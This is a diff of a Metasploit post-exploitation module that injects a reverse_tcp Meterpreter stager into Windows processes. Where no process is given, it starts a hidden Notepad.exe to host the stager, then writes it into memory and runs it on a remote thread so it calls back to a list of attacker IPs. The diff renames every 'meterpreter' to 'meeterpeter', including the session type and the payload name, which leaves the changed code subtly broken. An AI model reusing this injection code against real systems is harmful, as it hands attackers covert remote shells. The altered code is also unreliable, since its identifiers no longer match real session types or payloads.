@@ -23,12 +23,12 @@ class Metasploit3 < Msf::Post
                             'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
                          ],
       'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter']
+      'SessionTypes'  => [ 'meeterpeter']
     ))
 
     register_options(
       [
-        OptString.new('PAYLOAD', [false, 'Payload to inject in to process memory', "windows/meterpreter/reverse_tcp"]),
+        OptString.new('PAYLOAD', [false, 'Payload to inject in to process memory', "windows/meeterpeter/reverse_tcp"]),
         OptInt.new('LPORT',      [false, 'Port number for the payload LPORT variable.', 4444]),
         OptString.new('IPLIST',  [true, 'List of semicolom separated IP list.', Rex::Socket.source_address("1.2.3.4")]),
         OptString.new('PIDLIST', [false, 'List of semicolom separated PID list.', '']),
@@ -45,7 +45,7 @@ class Metasploit3 < Msf::Post
   # Run Method for when run command is issued
   def run
     unless client.platform =~ /win/
-      print_error("This module requires native Windows meterpreter functions not compatible with the selected session")
+      print_error("This module requires native Windows meeterpeter functions not compatible with the selected session")
       return
     end
     # Set variables
@@ -70,7 +70,7 @@ class Metasploit3 < Msf::Post
                 inject(a[1],payload)
                 select(nil, nil, nil, 5)
             else
-                # if no PID we create a process to host the Meterpreter session
+                # if no PID we create a process to host the meeterpeter session
                 payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
                 pid_num = start_proc(datastore['PROCESSNAME'])
                 inject(pid_num,payload)
@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Post
   # Function for injecting payload in to a given PID
   #-------------------------------------------------------------------------------
   def inject(target_pid, payload_to_inject)
-    print_status("Injecting meterpreter into process ID #{target_pid}")
+    print_status("Injecting meeterpeter into process ID #{target_pid}")
     begin
       host_process = session.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
       raw = payload_to_inject.generate
@@ -94,7 +94,7 @@ class Metasploit3 < Msf::Post
       print_status("Writing the stager into memory...")
       host_process.memory.write(mem, raw)
       host_process.thread.create(mem, 0)
-      print_good("Successfully injected Meterpreter in to process: #{target_pid}")
+      print_good("Successfully injected meeterpeter in to process: #{target_pid}")
     rescue::Exception => e
       print_error("Failed to Inject Payload to #{target_pid}!")
       print_error(e.message)
@@ -123,7 +123,7 @@ class Metasploit3 < Msf::Post
   # Function for Creating the Payload
   #-------------------------------------------------------------------------------
   def create_payload(payload_type,lhost,lport)
-    print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
+    print_status("Creating a reverse meeterpeter stager: LHOST=#{lhost} LPORT=#{lport}")
     payload = payload_type
     pay = client.framework.payloads.create(payload)
     pay.datastore['LHOST'] = lhost
@@ -134,7 +134,7 @@ class Metasploit3 < Msf::Post
   # Function starting notepad.exe process
   #-------------------------------------------------------------------------------
   def start_proc(proc_name)
-    print_good("Starting Notepad.exe to house Meterpreter Session.")
+    print_good("Starting Notepad.exe to house meeterpeter Session.")
     proc = client.sys.process.execute(proc_name, nil, {'Hidden' => true })
     print_good("Process created with pid #{proc.pid}")
     return proc.pid
